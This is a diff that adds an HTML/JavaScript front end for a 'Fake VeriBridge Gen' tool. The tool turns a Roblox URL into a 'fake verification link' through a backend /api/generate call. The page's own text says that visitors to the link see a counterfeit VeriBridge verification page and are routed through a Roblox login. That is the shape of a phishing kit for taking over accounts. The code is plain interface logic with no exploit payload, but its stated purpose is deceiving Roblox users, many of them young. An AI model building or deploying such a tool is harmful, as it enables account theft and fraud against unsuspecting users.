@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Fake VeriBridge Gen | Roblox Link Generator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @keyframes shine {
+            0% { background-position: -100% 0; }
+            100% { background-position: 200% 0; }
+        }
+        .shine-text {
+            background: linear-gradient(100deg, #ffffff 45%, #00ffff 50%, #ffffff 55%);
+            background-size: 200% auto;
+            color: transparent;
+            -webkit-background-clip: text;
+            background-clip: text;
+            animation: shine 4s linear infinite;
+        }
+        .toast-notification {
+            animation: slideIn 0.3s ease-out forwards;
+        }
+        @keyframes slideIn {
+            0% { transform: translateX(100%); opacity: 0; }
+            100% { transform: translateX(0); opacity: 1; }
+        }
+    </style>
+</head>
+<body class="bg-black text-white">
+    <div class="fixed inset-0 -z-10 bg-[radial-gradient(#0d0d0d_1px,transparent_1px)] [background-size:16px_16px]"></div>
+    <div class="fixed top-0 z-[-2] h-screen w-full bg-[radial-gradient(ellipse_60%_60%_at_50%_-20%,rgba(0,255,255,0.15),rgba(255,255,255,0))]"></div>
+
+    <div id="toastContainer" class="fixed bottom-4 right-4 z-50 flex flex-col gap-2"></div>
+
+    <div class="flex min-h-screen items-center justify-center p-4">
+        <div class="w-full max-w-2xl text-center">
+            <div class="bg-black/40 backdrop-blur-xl border border-cyan-500/30 rounded-2xl p-6 sm:p-8">
+                <h1 class="text-2xl sm:text-3xl font-bold shine-text mb-2">Fake VeriBridge Gen</h1>
+                <p class="text-xs text-cyan-400/60 mb-6">Generate fake verification links that show the VeriBridge page</p>
+
+                <div class="space-y-4">
+                    <div class="text-left">
+                        <label class="text-sm font-medium text-cyan-300/80 mb-1 block">Target Roblox URL</label>
+                        <div class="flex flex-col sm:flex-row gap-2 bg-zinc-900/80 rounded-xl p-2 border border-cyan-500/20">
+                            <input id="targetUrl" class="bg-transparent outline-none text-sm text-white pl-3 flex-1 min-w-0" placeholder="https://www.roblox.com/groups/1234567">
+                            <button id="generateBtn" class="bg-gradient-to-r from-cyan-600 to-blue-600 px-5 py-2 rounded-lg hover:from-cyan-500 hover:to-blue-500 transition-all flex items-center justify-center gap-2">
+                                <svg class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"/></svg>
+                                Generate
+                            </button>
+                        </div>
+                    </div>
+
+                    <div id="resultSection" class="hidden mt-4">
+                        <div class="bg-cyan-950/40 rounded-xl p-4 border border-cyan-500/30">
+                            <div class="flex justify-between mb-2">
+                                <span class="text-xs text-cyan-300/80">✨ Generated Verification Link</span>
+                                <span class="text-[10px] text-cyan-400/50">click to copy</span>
+                            </div>
+                            <code id="resultUrl" class="block bg-black/50 text-cyan-300 text-sm font-mono p-3 rounded-lg break-all cursor-pointer"></code>
+                            <div class="flex gap-2 mt-3">
+                                <button id="copyBtn" class="flex-1 bg-zinc-800 py-2 rounded-lg hover:bg-zinc-700 text-sm flex items-center justify-center gap-2">
+                                    <svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
+                                    Copy
+                                </button>
+                                <button id="testBtn" class="flex-1 bg-cyan-900/50 py-2 rounded-lg hover:bg-cyan-800/50 text-sm flex items-center justify-center gap-2">
+                                    <svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"/></svg>
+                                    Test
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="errorMsg" class="text-red-400 text-sm min-h-[40px]"></div>
+                    
+                    <div class="text-[10px] text-white/30 pt-4 border-t border-white/10">
+                        <p>⚠️ When someone visits the generated link, they'll see the full VeriBridge verification page</p>
+                        <p class="mt-1">The page will redirect them to Roblox login, then back to complete verification</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const targetUrl = document.getElementById('targetUrl');
+        const generateBtn = document.getElementById('generateBtn');
+        const resultSection = document.getElementById('resultSection');
+        const resultUrl = document.getElementById('resultUrl');
+        const copyBtn = document.getElementById('copyBtn');
+        const testBtn = document.getElementById('testBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const toastContainer = document.getElementById('toastContainer');
+
+        function showToast(msg, type = 'success') {
+            const toast = document.createElement('div');
+            toast.className = `toast-notification ${type === 'success' ? 'bg-green-600' : 'bg-red-600'} text-white px-4 py-2 rounded-lg shadow-lg mb-2 text-sm`;
+            toast.innerText = msg;
+            toastContainer.appendChild(toast);
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                setTimeout(() => toast.remove(), 300);
+            }, 2500);
+        }
+
+        async function generateLink() {
+            let url = targetUrl.value.trim();
+            if (!url) {
+                errorMsg.innerText = '❌ Please enter a Roblox URL';
+                return;
+            }
+            if (!url.includes('roblox.com')) {
+                errorMsg.innerText = '❌ Please enter a valid Roblox URL';
+                return;
+            }
+            errorMsg.innerText = '';
+            generateBtn.disabled = true;
+            generateBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div> Generating...';
+
+            try {
+                const res = await fetch('/api/generate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ url })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    resultUrl.innerText = data.generatedUrl;
+                    resultSection.classList.remove('hidden');
+                    showToast('✅ Link generated! The verification page is ready.', 'success');
+                } else {
+                    errorMsg.innerText = '❌ ' + data.error;
+                    resultSection.classList.add('hidden');
+                }
+            } catch (err) {
+                errorMsg.innerText = '❌ Network error';
+                resultSection.classList.add('hidden');
+            } finally {
+                generateBtn.disabled = false;
+                generateBtn.innerHTML = '<svg class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"/></svg> Generate';
+            }
+        }
+
+        async function copyLink() {
+            const text = resultUrl.innerText;
+            if (!text) return;
+            await navigator.clipboard.writeText(text);
+            showToast('📋 Link copied to clipboard!');
+            const original = copyBtn.innerHTML;
+            copyBtn.innerHTML = '<svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 13l4 4L19 7"/></svg> Copied!';
+            setTimeout(() => { copyBtn.innerHTML = original; }, 1500);
+        }
+
+        function testLink() {
+            const link = resultUrl.innerText;
+            if (link) {
+                window.open(link, '_blank');
+            }
+        }
+
+        generateBtn.addEventListener('click', generateLink);
+        copyBtn.addEventListener('click', copyLink);
+        testBtn.addEventListener('click', testLink);
+        targetUrl.addEventListener('keypress', (e) => { if (e.key === 'Enter') generateLink(); });
+        targetUrl.addEventListener('input', () => {
+            resultSection.classList.add('hidden');
+            errorMsg.innerText = '';
+        });
+    </script>
+</body>
+</html>
